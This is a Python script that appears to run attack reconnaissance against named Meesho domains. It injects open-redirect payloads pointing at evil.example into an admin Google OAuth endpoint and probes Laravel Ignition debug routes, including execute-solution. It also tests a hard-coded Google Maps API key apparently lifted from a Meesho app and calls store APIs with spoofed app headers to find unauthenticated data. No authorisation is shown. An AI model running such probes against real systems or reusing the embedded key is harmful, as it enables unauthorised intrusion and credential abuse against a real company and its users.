#!/usr/bin/env python3
"""Meesho Wave10 clean-egress: Google OAuth Location capture, Ignition route-diff, Maps key check. No RCE payloads."""
import json, urllib.request, urllib.error, ssl, re, urllib.parse
ctx = ssl.create_default_context()
out = {"probes": [], "leads": []}

class NR(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None

def probe(url, headers=None, method="GET", data=None, no_redir=True):
    h = {"User-Agent": "Mozilla/5.0"}
    if headers:
        h.update(headers)
    handlers = [urllib.request.HTTPSHandler(context=ctx)]
    if no_redir:
        handlers.insert(0, NR())
    opener = urllib.request.build_opener(*handlers)
    try:
        req = urllib.request.Request(url, data=data, headers=h, method=method)
        resp = opener.open(req, timeout=20)
        return resp.status, dict(resp.headers), resp.read(12000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read(12000).decode("utf-8", "replace")
    except Exception as e:
        return 0, {}, str(e)

# 1) Admin Google OAuth - capture Location to accounts.google.com
oauth_urls = [
    "https://admin.meeshosupply.com/api/google/oauth?redirect=https://evil.example/callback",
    "https://admin.meeshosupply.com/api/google/oauth?redirect=%2Fdashboard",
    "https://admin.meeshosupply.com/api/google/oauth?redirect=https://admin.meeshosupply.com/",
    "https://admin.meeshosupply.com/api/google/oauth?redirect=//evil.example",
    "https://admin.meeshosupply.com/api/google/oauth",
]
for url in oauth_urls:
    for ua in ["Mozilla/5.0", "okhttp/4.9.0", "Googlebot/2.1"]:
        code, hdrs, body = probe(url, {"User-Agent": ua})
        loc = hdrs.get("Location") or hdrs.get("location") or ""
        entry = {"type": "oauth", "url": url, "ua": ua, "code": code, "location": loc[:800], "body": body[:300]}
        if "accounts.google.com" in loc:
            qs = urllib.parse.parse_qs(urllib.parse.urlparse(loc).query)
            entry["redirect_uri"] = (qs.get("redirect_uri") or [None])[0]
            entry["state"] = ((qs.get("state") or [None])[0] or "")[:300]
            if "evil.example" in loc or "evil.example" in (entry.get("state") or ""):
                out["leads"].append({**entry, "reason": "evil_in_google_oauth"})
        out["probes"].append(entry)

# 2) Ignition route-diff only
for path in ["/_ignition/health-check", "/_ignition/execute-solution"]:
    url = "https://admin.meeshosupply.com" + path
    code, hdrs, body = probe(url, {"User-Agent": "okhttp/4.9.0", "Accept": "application/json"})
    out["probes"].append({"type": "ignition", "url": url, "code": code, "ctype": hdrs.get("Content-Type"), "body": body[:400]})
    if code == 200 and body.strip().startswith("{"):
        out["leads"].append({"type": "ignition_json", "url": url, "body": body[:400]})

# 3) Google Maps API key from superstore
GKEY = "AIzaSyA1iQtzbADUIux4bLPfIv8JFt5cHjy-g4E"
maps = f"https://maps.googleapis.com/maps/api/geocode/json?address=Nagpur&key={GKEY}"
for ref in [None, "https://superstoreapp.meesho.com/", "https://www.meesho.com/"]:
    h = {"User-Agent": "Mozilla/5.0"}
    if ref:
        h["Referer"] = ref
    code, hdrs, body = probe(maps, h, no_redir=False)
    entry = {"type": "maps_key", "referer": ref, "code": code, "body": body[:500]}
    out["probes"].append(entry)
    if '"status" : "OK"' in body or '"status":"OK"' in body:
        out["leads"].append({**entry, "reason": "maps_api_key_works"})

# 4) Superstore with full mobile-ish headers from clean IP
BASE = "https://superstoreapp.meesho.com"
hdr = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
    "APP-USER-ID": "1",
    "App-Version-Code": "512",
    "App-Session-Id": "gha-wave10-session",
    "Instance-Id": "b0382b39-6e59-4e17-a899-8d88d14a7e42",
    "Xo": "test",
    "Origin": BASE,
    "Referer": BASE + "/",
    "Accept": "application/json",
}
for path in [
    "/api/customer/config?pincode=440002",
    "/api/products/2.0/fetch?limit=3&pincode=440002",
    "/api/customer/pages/home?pincode=440002",
]:
    code, hdrs, body = probe(BASE + path, hdr, no_redir=False)
    out["probes"].append({"type": "superstore", "path": path, "code": code, "body": body[:400]})
    if code == 200 and "product" in body.lower():
        out["leads"].append({"type": "superstore_unauth", "path": path, "body": body[:400]})

path = "artifacts/meesho_wave10_gha.json"
import os
os.makedirs("artifacts", exist_ok=True)
with open(path, "w") as f:
    json.dump(out, f, indent=2)
print(json.dumps({"probes": len(out["probes"]), "leads": out["leads"]}, indent=2))
